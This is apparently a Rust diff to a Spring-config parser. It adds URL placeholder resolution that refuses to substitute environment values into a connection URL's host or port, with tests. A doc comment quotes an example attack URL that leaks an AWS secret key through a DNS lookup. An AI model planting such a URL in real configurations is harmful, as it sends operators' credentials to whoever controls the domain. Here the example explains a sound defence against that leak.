@@ -364,6 +364,12 @@ fn unquote_yaml_scalar(s: &str) -> &str {
 /// `${...}` (e.g. `${OUTER:${INNER}}` — Spring supports resolving the
 /// default itself as a placeholder; this parser does not attempt
 /// that, and flags it instead of guessing).
+///
+/// Every entry is the placeholder **body** — the text between `${` and
+/// `}`, with no wrapper — so a consumer can render any of them
+/// uniformly as `${body}`. (Entries used to mix bare names with
+/// already-wrapped `${…}` strings, which made callers emit
+/// `${${OUTER:${INNER}}}`.)
 pub fn resolve_placeholders(
     value: &str,
     lookup: impl Fn(&str) -> Option<String>,
@@ -381,16 +387,19 @@ pub fn resolve_placeholders(
         match find_matching_close(&rest[body_start..]) {
             None => {
                 // Unterminated `${` — nothing sensible to resolve;
-                // flag the rest verbatim and stop scanning.
-                missing.push(rest[start..].to_string());
+                // flag the rest of the body and stop scanning. The
+                // leading `${` is dropped so the entry is a bare body
+                // like every other one.
+                missing.push(rest[body_start..].to_string());
                 break;
             }
             Some(len) => {
                 let body = &rest[body_start..body_start + len];
                 if body.contains("${") {
                     // Nested placeholder in the name/default — not
-                    // attempted, just flagged.
-                    missing.push(format!("${{{body}}}"));
+                    // attempted, just flagged. The body goes in bare;
+                    // wrapping it here is the caller's job.
+                    missing.push(body.to_string());
                 } else {
                     match body.split_once(':') {
                         Some((name, default)) => match lookup(name) {
@@ -412,6 +421,155 @@ pub fn resolve_placeholders(
     } else {
         Err(missing)
     }
+}
+
+/// The outcome of [`resolve_url_placeholders`].
+#[derive(Debug, Clone, PartialEq, Eq, Default)]
+pub struct UrlResolution {
+    /// The URL with every *permitted* placeholder substituted. Anything
+    /// in `in_host` is left as literal `${…}` text — it is never
+    /// substituted, so this value is only ever safe to *display*, not
+    /// to connect to, while `in_host` is non-empty.
+    pub value: String,
+    /// Placeholder bodies that `lookup` couldn't resolve (an unset name
+    /// with no default, or a nested/malformed placeholder).
+    pub missing: Vec<String>,
+    /// Placeholder bodies sitting where the host or port goes. These
+    /// are **never** resolved, whatever the environment holds.
+    pub in_host: Vec<String>,
+}
+
+impl UrlResolution {
+    /// True when nothing blocks using `value` as a connection URL.
+    pub fn is_clean(&self) -> bool {
+        self.missing.is_empty() && self.in_host.is_empty()
+    }
+}
+
+/// Resolve `${…}` placeholders in a connection URL — but **never** one
+/// that would land in the URL's host or port.
+///
+/// `application*.yml` comes out of the working tree, so whoever wrote
+/// the checkout chooses both the placeholder names and the domain they
+/// sit under. `url: jdbc:postgresql://${AWS_SECRET_ACCESS_KEY}.example
+/// .com/db` exfiltrates the operator's credential over DNS the moment
+/// pgman resolves it — no Postgres server needed, just a lookup. So
+/// resolution is allowed for the userinfo (username / password), the
+/// path (database name) and the query string, and refused outright for
+/// the `host[:port]` component. A placeholder there is reported in
+/// `in_host` and left as literal text, which stops the pick from being
+/// connected to at all (`App::refuse_if_unresolved`).
+///
+/// A URL with no `://` at all — `url: ${SPRING_DATASOURCE_URL}`, or
+/// `${PREFIX}//host/db` — has no identifiable host component, so *every*
+/// placeholder in it is treated as host-tainting. Same for a
+/// placeholder in the scheme.
+pub fn resolve_url_placeholders(
+    url: &str,
+    lookup: impl Fn(&str) -> Option<String>,
+) -> UrlResolution {
+    // No parseable authority → the whole string could become a host.
+    let Some(scheme_end) = url.find("://") else {
+        return UrlResolution {
+            value: url.to_string(),
+            missing: Vec::new(),
+            in_host: placeholder_bodies(url),
+        };
+    };
+    let authority_start = scheme_end + 3;
+    let scheme = &url[..authority_start];
+    if scheme.contains("${") {
+        // `${SCHEME}://…` — we can't reason about what the resolved
+        // text would make the authority, so refuse the lot.
+        return UrlResolution {
+            value: url.to_string(),
+            missing: Vec::new(),
+            in_host: placeholder_bodies(url),
+        };
+    }
+    let rest = &url[authority_start..];
+    let authority_len = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+    let authority = &rest[..authority_len];
+    let tail = &rest[authority_len..];
+    // Split userinfo from host[:port] at the last `@` that isn't inside
+    // a `${…}` (a placeholder's default value may contain one).
+    let (userinfo, hostport) = match last_top_level_at(authority) {
+        Some(i) => (&authority[..=i], &authority[i + 1..]),
+        None => ("", authority),
+    };
+
+    let mut missing = Vec::new();
+    let mut value = String::from(scheme);
+    // Userinfo: resolved. A password or username from the environment
+    // reaches only the server named by the (literal) host.
+    match resolve_placeholders(userinfo, &lookup) {
+        Ok(v) => value.push_str(&v),
+        Err(m) => {
+            value.push_str(userinfo);
+            missing.extend(m);
+        }
+    }
+    // host[:port]: never resolved.
+    let in_host = placeholder_bodies(hostport);
+    value.push_str(hostport);
+    // Path (database name) + query: resolved.
+    match resolve_placeholders(tail, &lookup) {
+        Ok(v) => value.push_str(&v),
+        Err(m) => {
+            value.push_str(tail);
+            missing.extend(m);
+        }
+    }
+    UrlResolution {
+        value,
+        missing,
+        in_host,
+    }
+}
+
+/// Every `${…}` body in `s`, in order. An unterminated `${` yields the
+/// rest of the string as its body, matching `resolve_placeholders`.
+fn placeholder_bodies(s: &str) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut rest = s;
+    while let Some(start) = rest.find("${") {
+        let body_start = start + 2;
+        match find_matching_close(&rest[body_start..]) {
+            None => {
+                out.push(rest[body_start..].to_string());
+                break;
+            }
+            Some(len) => {
+                out.push(rest[body_start..body_start + len].to_string());
+                rest = &rest[body_start + len + 1..];
+            }
+        }
+    }
+    out
+}
+
+/// Index of the last `@` in `s` that sits outside any `${…}`. Used to
+/// split userinfo from host[:port] without being fooled by a default
+/// value like `${DB_USER:me@example.com}`.
+fn last_top_level_at(s: &str) -> Option<usize> {
+    let mut found = None;
+    let mut depth = 0u32;
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() {
+        match bytes[i] {
+            b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'{' => {
+                depth += 1;
+                i += 2;
+                continue;
+            }
+            b'}' if depth > 0 => depth -= 1,
+            b'@' if depth == 0 => found = Some(i),
+            _ => {}
+        }
+        i += 1;
+    }
+    found
 }
 
 /// Find the index (relative to `s`, the text right after an opening
@@ -872,6 +1030,118 @@ dataSource:
     fn resolve_placeholders_collects_every_unresolved_name() {
         let got = resolve_placeholders("${DB_HOST}/${DB_NAME}", |_| None);
         assert_eq!(got, Err(vec!["DB_HOST".to_string(), "DB_NAME".to_string()]));
+    }
+
+    #[test]
+    fn resolve_placeholders_reports_bare_bodies_never_wrapped_ones() {
+        // Consumers render an entry as `${entry}`; an entry that
+        // already carried its own `${…}` produced `${${…}}`.
+        let nested = resolve_placeholders("${DB_HOST:${FALLBACK}}", |_| None).unwrap_err();
+        assert_eq!(nested, vec!["DB_HOST:${FALLBACK}".to_string()]);
+        let unterminated =
+            resolve_placeholders("jdbc:postgresql://${DB_HOST", |_| None).unwrap_err();
+        assert_eq!(unterminated, vec!["DB_HOST".to_string()]);
+        for entry in nested.iter().chain(unterminated.iter()) {
+            assert!(
+                !entry.starts_with("${"),
+                "entry should be a bare body, got {entry:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn resolve_url_placeholders_never_resolves_the_host() {
+        // The whole point: DB_HOST *is* set, and it still doesn't get
+        // substituted, because a resolved value in the host position
+        // leaves the machine as a DNS lookup to whoever wrote the URL.
+        let got = resolve_url_placeholders("jdbc:postgresql://${DB_HOST}/orders", |n| {
+            (n == "DB_HOST").then(|| "db.internal".to_string())
+        });
+        assert_eq!(got.in_host, vec!["DB_HOST".to_string()]);
+        assert!(got.missing.is_empty());
+        assert_eq!(got.value, "jdbc:postgresql://${DB_HOST}/orders");
+        assert!(!got.is_clean());
+    }
+
+    #[test]
+    fn resolve_url_placeholders_never_resolves_the_port() {
+        let got = resolve_url_placeholders("jdbc:postgresql://db:${DB_PORT}/orders", |_| {
+            Some("5432".to_string())
+        });
+        assert_eq!(got.in_host, vec!["DB_PORT".to_string()]);
+        assert_eq!(got.value, "jdbc:postgresql://db:${DB_PORT}/orders");
+    }
+
+    #[test]
+    fn resolve_url_placeholders_resolves_user_password_and_dbname() {
+        let got = resolve_url_placeholders(
+            "jdbc:postgresql://${DB_USER}:${DB_PW}@db.internal:5432/${DB_NAME}",
+            |n| match n {
+                "DB_USER" => Some("svc".into()),
+                "DB_PW" => Some("s3cret".into()),
+                "DB_NAME" => Some("orders".into()),
+                _ => None,
+            },
+        );
+        assert!(got.is_clean(), "unexpected: {got:?}");
+        assert_eq!(
+            got.value,
+            "jdbc:postgresql://svc:s3cret@db.internal:5432/orders"
+        );
+    }
+
+    #[test]
+    fn resolve_url_placeholders_reports_an_unset_username() {
+        let got = resolve_url_placeholders("jdbc:postgresql://${DB_USER}@db/orders", |_| None);
+        assert_eq!(got.missing, vec!["DB_USER".to_string()]);
+        assert!(got.in_host.is_empty(), "the user is not the host");
+    }
+
+    #[test]
+    fn resolve_url_placeholders_userinfo_default_containing_an_at_still_splits_right() {
+        let got =
+            resolve_url_placeholders("jdbc:postgresql://${DB_USER:me@corp}@db/orders", |_| None);
+        assert!(got.in_host.is_empty(), "host is literal `db`: {got:?}");
+        assert_eq!(got.value, "jdbc:postgresql://me@corp@db/orders");
+    }
+
+    #[test]
+    fn resolve_url_placeholders_without_a_scheme_refuses_everything() {
+        // `spring.datasource.url=${SPRING_DATASOURCE_URL}` — there's no
+        // host component to protect, so the whole value is off limits.
+        let got = resolve_url_placeholders("${SPRING_DATASOURCE_URL}", |_| {
+            Some("jdbc:postgresql://evil/db".to_string())
+        });
+        assert_eq!(got.in_host, vec!["SPRING_DATASOURCE_URL".to_string()]);
+        assert_eq!(got.value, "${SPRING_DATASOURCE_URL}");
+    }
+
+    #[test]
+    fn resolve_url_placeholders_scheme_placeholder_refuses_everything() {
+        let got =
+            resolve_url_placeholders("${SCHEME}://${DB_USER}@host/db", |_| Some("x".to_string()));
+        assert_eq!(
+            got.in_host,
+            vec!["SCHEME".to_string(), "DB_USER".to_string()]
+        );
+        assert_eq!(got.value, "${SCHEME}://${DB_USER}@host/db");
+    }
+
+    #[test]
+    fn resolve_url_placeholders_plain_url_is_unchanged_and_clean() {
+        let got =
+            resolve_url_placeholders("jdbc:postgresql://h:5432/app?sslmode=require", |_| None);
+        assert!(got.is_clean());
+        assert_eq!(got.value, "jdbc:postgresql://h:5432/app?sslmode=require");
+    }
+
+    #[test]
+    fn placeholder_bodies_lists_every_body_in_order() {
+        assert_eq!(
+            placeholder_bodies("${A}.${B:x}.plain.${C"),
+            vec!["A".to_string(), "B:x".to_string(), "C".to_string()]
+        );
+        assert!(placeholder_bodies("no placeholders").is_empty());
     }
 
     #[test]
